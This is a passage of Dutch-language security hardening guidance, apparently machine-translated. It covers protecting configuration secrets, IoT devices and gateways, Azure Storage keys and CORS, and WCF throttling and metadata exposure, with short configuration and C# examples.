| **Stappen** | Configuratie bestanden zoals de Web.config, appsettings.jsop worden vaak gebruikt om gevoelige informatie te bewaren, zoals gebruikers namen, wacht woorden, database verbindings reeksen en versleutelings sleutels. Als u deze informatie niet beveiligt, is uw toepassing kwetsbaar voor aanvallen of kwaadwillende gebruikers die gevoelige informatie verkrijgen, zoals gebruikers namen en wacht woorden voor accounts, database namen en server namen. Op basis van het implementatie type (Azure/on-premises) versleutelt u de gevoelige secties van de configuratie bestanden met behulp van DPAPI of services als Azure Key Vault. |

## <a name="ensure-that-all-admin-interfaces-are-secured-with-strong-credentials"></a><a id="admin-strong"></a>Zorg ervoor dat alle beheer interfaces zijn beveiligd met sterke referenties

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | IoT-apparaat | 
| **SDL-fase**               | Implementatie |  
| **Toepasselijke technologieën** | Algemeen |
| **Kenmerken**              | N.v.t.  |
| **Referenties**              | N.v.t.  |
| **Stappen** | Alle beheer interfaces die het apparaat of de veld Gateway weergeeft, moeten worden beveiligd met sterke referenties. Daarnaast moeten andere weer gegeven interfaces zoals WiFi, SSH, bestands shares en FTP worden beveiligd met sterke referenties. Standaard zwakke wacht woorden mogen niet worden gebruikt. |

## <a name="ensure-that-unknown-code-cannot-execute-on-devices"></a><a id="unknown-exe"></a>Ervoor zorgen dat onbekende code niet kan worden uitgevoerd op apparaten

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | IoT-apparaat | 
| **SDL-fase**               | Build |  
| **Toepasselijke technologieën** | Algemeen |
| **Kenmerken**              | N.v.t.  |
| **Referenties**              | [Het inschakelen van veilige opstart-en BitLocker-Apparaatversleuteling in Windows 10 IoT core](/windows/iot-core/secure-your-device/securebootandbitlocker) |
| **Stappen** | UEFI Secure boot beperkt het systeem zodat er alleen binaire bestanden kunnen worden uitgevoerd die zijn ondertekend door een opgegeven instantie. Deze functie voor komt dat onbekende code wordt uitgevoerd op het platform en de beveiligings-postuur mogelijk verzwakt. Schakel UEFI Secure boot in en beperk de lijst met certificerings instanties die worden vertrouwd voor het ondertekenen van code. Onderteken alle code die op het apparaat is geïmplementeerd met behulp van een van de vertrouwde instanties. |

## <a name="encrypt-os-and-additional-partitions-of-iot-device-with-bit-locker"></a><a id="partition-iot"></a>Versleutelen van het besturings systeem en extra partities van IoT-apparaten met de bits-kluis

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | IoT-apparaat | 
| **SDL-fase**               | Build |  
| **Toepasselijke technologieën** | Algemeen |
| **Kenmerken**              | N.v.t.  |
| **Referenties**              | N.v.t.  |
| **Stappen** | Windows 10 IoT core implementeert een licht gewicht-versie van bits-kluis versleuteling, die een sterke afhankelijkheid heeft van de aanwezigheid van een TPM op het platform, met inbegrip van het benodigde preOS-protocol in UEFI dat de benodigde metingen uitvoert. Deze preOS-metingen zorgen ervoor dat het besturings systeem later een definitieve record bevat over de manier waarop het besturings systeem is gestart. Versleutelt OS-partities met een bit-kluis en eventuele extra partities als er gevoelige gegevens worden opgeslagen. |

## <a name="ensure-that-only-the-minimum-servicesfeatures-are-enabled-on-devices"></a><a id="min-enable"></a>Zorg ervoor dat alleen de minimale Services/functies zijn ingeschakeld op apparaten

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | IoT-apparaat | 
| **SDL-fase**               | Implementatie |  
| **Toepasselijke technologieën** | Algemeen |
| **Kenmerken**              | N.v.t.  |
| **Referenties**              | N.v.t.  |
| **Stappen** | Schakel geen functies of services in of uit in het besturings systeem die niet vereist zijn voor de werking van de oplossing. Als voor het apparaat bijvoorbeeld geen gebruikers interface moet worden geïmplementeerd, installeert u Windows IoT core in de modus headless. |

## <a name="encrypt-os-and-additional-partitions-of-iot-field-gateway-with-bit-locker"></a><a id="field-bit-locker"></a>Versleutelen van besturings systeem en extra partities van IoT-veld Gateway met een bit-kluis

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | IoT-veld Gateway | 
| **SDL-fase**               | Implementatie |  
| **Toepasselijke technologieën** | Algemeen |
| **Kenmerken**              | N.v.t.  |
| **Referenties**              | N.v.t.  |
| **Stappen** | Windows 10 IoT core implementeert een licht gewicht-versie van bits-kluis versleuteling, die een sterke afhankelijkheid heeft van de aanwezigheid van een TPM op het platform, met inbegrip van het benodigde preOS-protocol in UEFI dat de benodigde metingen uitvoert. Deze preOS-metingen zorgen ervoor dat het besturings systeem later een definitieve record bevat over de manier waarop het besturings systeem is gestart. Versleutelt OS-partities met een bit-kluis en eventuele extra partities als er gevoelige gegevens worden opgeslagen. |

## <a name="ensure-that-the-default-login-credentials-of-the-field-gateway-are-changed-during-installation"></a><a id="default-change"></a>Zorg ervoor dat de standaard aanmeldings referenties van de veld Gateway tijdens de installatie worden gewijzigd

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | IoT-veld Gateway | 
| **SDL-fase**               | Implementatie |  
| **Toepasselijke technologieën** | Algemeen |
| **Kenmerken**              | N.v.t.  |
| **Referenties**              | N.v.t.  |
| **Stappen** | Zorg ervoor dat de standaard aanmeldings referenties van de veld Gateway tijdens de installatie worden gewijzigd |

## <a name="ensure-that-the-cloud-gateway-implements-a-process-to-keep-the-connected-devices-firmware-up-to-date"></a><a id="cloud-firmware"></a>Zorg ervoor dat de Cloud gateway een proces implementeert om ervoor te zorgen dat de firmware van de aangesloten apparaten up-to-date is

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | IoT-Cloud gateway | 
| **SDL-fase**               | Build |  
| **Toepasselijke technologieën** | Algemeen |
| **Kenmerken**              | Gateway keuze-Azure IoT Hub |
| **Referenties**              | [Overzicht van IOT hub Apparaatbeheer](../../iot-hub/iot-hub-device-management-overview.md), [het bijwerken](../../iot-hub/tutorial-firmware-update.md) van de firmware van een apparaat |
| **Stappen** | LWM2M is een protocol van de Open Mobile Alliance voor IoT Device Management. Azure IoT-Apparaatbeheer maakt het mogelijk om met behulp van apparaatfuncties te communiceren met fysieke apparaten. Zorg ervoor dat de Cloud gateway een proces implementeert om het apparaat en andere configuratie gegevens regel matig up-to-date te houden met behulp van Azure IoT Hub Device Management. |

## <a name="ensure-that-devices-have-end-point-security-controls-configured-as-per-organizational-policies"></a><a id="controls-policies"></a>Zorg ervoor dat het beveiligings beheer voor apparaten op het eind punt is geconfigureerd volgens het beleid van de organisatie

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | Grens van computer vertrouwen | 
| **SDL-fase**               | Implementatie |  
| **Toepasselijke technologieën** | Algemeen |
| **Kenmerken**              | N.v.t.  |
| **Referenties**              | N.v.t.  |
| **Stappen** | Zorg ervoor dat apparaten end-point security-besturings elementen hebben, zoals een bit-kluis voor versleuteling op schijf niveau, anti-virus met bijgewerkte hand tekeningen, op de host gebaseerde firewall, upgrades van besturings systemen, groeps beleid, enzovoort, zijn geconfigureerd als per organisatie beveiligings beleid. |

## <a name="ensure-secure-management-of-azure-storage-access-keys"></a><a id="secure-keys"></a>Veilig beheer van toegangs sleutels voor Azure Storage garanderen

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | Azure Storage | 
| **SDL-fase**               | Implementatie |  
| **Toepasselijke technologieën** | Algemeen |
| **Kenmerken**              | N.v.t.  |
| **Referenties**              | [Azure Storage beveiligings handleiding: de sleutels van uw opslag account beheren](../../storage/blobs/security-recommendations.md#identity-and-access-management) |
| **Stappen** | <p>Sleutel opslag: het wordt aanbevolen om de Azure Storage toegangs sleutels in Azure Key Vault als geheim op te slaan en de toepassingen de sleutel van de sleutel kluis te laten ophalen. Dit wordt aanbevolen vanwege de volgende redenen:</p><ul><li>De toepassing beschikt nooit over de opslag sleutel die is opgeslagen in een configuratie bestand, waardoor dat verloopt van iemand die toegang krijgt tot de sleutels zonder specifieke toestemming</li><li>Toegang tot de sleutels kan worden beheerd met behulp van Azure Active Directory. Dit betekent dat de eigenaar van een account toegang kan verlenen tot de toepassingen die de sleutels moeten ophalen uit Azure Key Vault. Andere toepassingen hebben geen toegang tot de sleutels zonder specifiek toestemming te verlenen</li><li>Sleutel opnieuw genereren: het wordt aanbevolen een proces te hebben om de toegangs sleutels voor Azure Storage om veiligheids redenen opnieuw te genereren. Informatie over waarom en hoe u moet plannen voor het opnieuw genereren van sleutels, wordt beschreven in het artikel Azure Storage Security Guide Reference</li></ul>|

## <a name="ensure-that-only-trusted-origins-are-allowed-if-cors-is-enabled-on-azure-storage"></a><a id="cors-storage"></a>Zorg ervoor dat alleen vertrouwde oorsprongen zijn toegestaan als CORS is ingeschakeld in azure Storage

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | Azure Storage | 
| **SDL-fase**               | Build |  
| **Toepasselijke technologieën** | Algemeen |
| **Kenmerken**              | N.v.t.  |
| **Referenties**              | [CORS-ondersteuning voor Azure Storage Services](/rest/api/storageservices/Cross-Origin-Resource-Sharing--CORS--Support-for-the-Azure-Storage-Services) |
| **Stappen** | Met Azure Storage kunt u CORS inschakelen: cross-Origin resource delen. Voor elk opslag account kunt u domeinen opgeven die toegang hebben tot de bronnen in dat opslag account. CORS is standaard uitgeschakeld voor alle services. U kunt CORS inschakelen met behulp van de REST API of de Storage-client bibliotheek om een van de methoden voor het instellen van het service beleid aan te roepen. |

## <a name="enable-wcfs-service-throttling-feature"></a><a id="throttling"></a>De functie voor het beperken van WCF-service inschakelen

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | WCF | 
| **SDL-fase**               | Build |  
| **Toepasselijke technologieën** | .NET Framework 3 |
| **Kenmerken**              | N.v.t.  |
| **Referenties**              | [MSDN](/previous-versions/msp-n-p/ff648500(v=pandp.10)), [Fortify Konink rijk](https://vulncat.fortify.com) |
| **Stappen** | <p>Als u geen limiet voor het gebruik van systeem bronnen plaatst, kan dit leiden tot bron uitputting en uiteindelijk een denial of service.</p><ul><li>**Uitleg:** Windows Communication Foundation (WCF) biedt de mogelijkheid om service aanvragen te beperken. Als u te veel client aanvragen toestaat, kan dit een systeem overlaten en de bronnen ervan uitgeput raken. Als u daarentegen slechts een klein aantal aanvragen voor een service toestaat, kan het gebruik van de service door legitieme gebruikers worden voor komen. Elke service moet afzonderlijk worden afgestemd op en geconfigureerd om de juiste hoeveelheid resources toe te staan.</li><li>**Aanbevelingen** Schakel de service beperkings functie van WCF in en stel de benodigde limieten in voor uw toepassing.</li></ul>|

### <a name="example"></a>Voorbeeld
Hier volgt een voor beeld van een configuratie met beperking ingeschakeld:
```
<system.serviceModel> 
  <behaviors>
    <serviceBehaviors>
    <behavior name="Throttled">
    <serviceThrottling maxConcurrentCalls="[YOUR SERVICE VALUE]" maxConcurrentSessions="[YOUR SERVICE VALUE]" maxConcurrentInstances="[YOUR SERVICE VALUE]" /> 
  ...
</system.serviceModel> 
```

## <a name="wcf-information-disclosure-through-metadata"></a><a id="info-metadata"></a>Informatie over het vrijgeven van WCF via meta gegevens

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | WCF | 
| **SDL-fase**               | Build |  
| **Toepasselijke technologieën** | .NET Framework 3 |
| **Kenmerken**              | N.v.t.  |
| **Referenties**              | [MSDN](/previous-versions/msp-n-p/ff648500(v=pandp.10)), [Fortify Konink rijk](https://vulncat.fortify.com) |
| **Stappen** | Meta gegevens kunnen kwaadwillende personen meer informatie geven over het systeem en een vorm van een aanval plannen. WCF-services kunnen worden geconfigureerd om meta gegevens zichtbaar te maken. Meta gegevens bieden gedetailleerde informatie over de service beschrijving en mogen niet worden uitgezonden in productie omgevingen. De `HttpGetEnabled`  /  `HttpsGetEnabled` Eigenschappen van de klasse ServiceMetaData bepalen of een service de meta gegevens beschikbaar maakt | 

### <a name="example"></a>Voorbeeld
Met de onderstaande code wordt het WCF van de meta gegevens van een service verzonden
```
ServiceMetadataBehavior smb = new ServiceMetadataBehavior();
smb.HttpGetEnabled = true; 
smb.HttpGetUrl = new Uri(EndPointAddress); 
Host.Description.Behaviors.Add(smb); 
```
Geen service-meta gegevens uitzenden in een productie omgeving. Stel de eigenschappen HttpGetEnabled/HttpsGetEnabled van de klasse ServiceMetaData in op false. 

### <a name="example"></a>Voorbeeld
De onderstaande code zorgt ervoor dat de meta gegevens van een service niet worden verzonden met WCF. 
```
ServiceMetadataBehavior smb = new ServiceMetadataBehavior(); 
smb.HttpGetEnabled = false; 
smb.HttpGetUrl = new Uri(EndPointAddress); 
Host.Description.Behaviors.Add(smb);
```